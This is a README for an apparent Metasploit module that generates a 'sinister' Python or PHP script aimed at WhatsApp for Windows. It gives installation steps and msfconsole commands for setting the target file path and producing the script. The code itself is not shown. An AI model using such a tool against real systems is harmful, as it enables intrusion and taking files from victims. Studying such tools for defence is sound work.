# WhatsApp for Windows Arbitrary Script Execution Exploit

This Metasploit module exploits a vulnerability in WhatsApp for Windows that allows the execution of arbitrary Python or PHP scripts. The module generates a sinister script and saves it to a specified location. The user can then deploy this script to the target system running WhatsApp for Windows.

## Features

Generates Python or PHP scripts

Allows customization of file paths

Saves the generated script to a specified location

## Requirements

Metasploit Framework

Python (generating Python scripts)

PHP (generating PHP scripts)

## Installation

1. Save the `whatsapp_windows.rb` file to the appropriate Metasploit modules directory. For example, place it in the auxiliary directory:
```
~/.msf4/modules/auxiliary/whatsapp_windows.rb
```
2. Start Metasploit and reload all modules to ensure that the new module is recognized:
````
msfconsole
msf > reload_all
````

## Usage

1. Use the new WhatsApp exploit module:

```
msf > use auxiliary/whatsapp_windows
```
2. Set the required options:

````
msf auxiliary(whatsapp_windows) > set SCRIPT_TYPE <script_type>
msf auxiliary(whatsapp_windows) > set FILE_PATH <file_path>
msf auxiliary(whatsapp_windows) > set OUTPUT_PATH <output_path>
````
  `SCRIPT_TYPE`: Type of script to generate (`python` or `php`).
  `FILE_PATH`: Path to the file to back up on the target system.
  `OUTPUT_PATH`: Path to save the sinister script on your system.

3. Run the module:

```
msf auxiliary(whatsapp_windows) > run
```
## Example
```
msf > use auxiliary/whatsapp_windows
msf auxiliary(whatsapp_windows) > set SCRIPT_TYPE python
msf auxiliary(whatsapp_windows) > set FILE_PATH C:\\path\\to\\important\\file.txt
msf auxiliary(whatsapp_windows) > set OUTPUT_PATH C:\\path\\to\\sinister_script
msf auxiliary(whatsapp_windows) > run
```
This example generates a Python script that backs up `C:\path\to\important\file.txt` and saves the sinister script to `C:\path\to\sinister_script.py`.

## Disclaimer

This module is for educational purposes only. Do not use it to exploit any software without explicit permission. Using this module to exploit vulnerabilities is illegal and unethical.
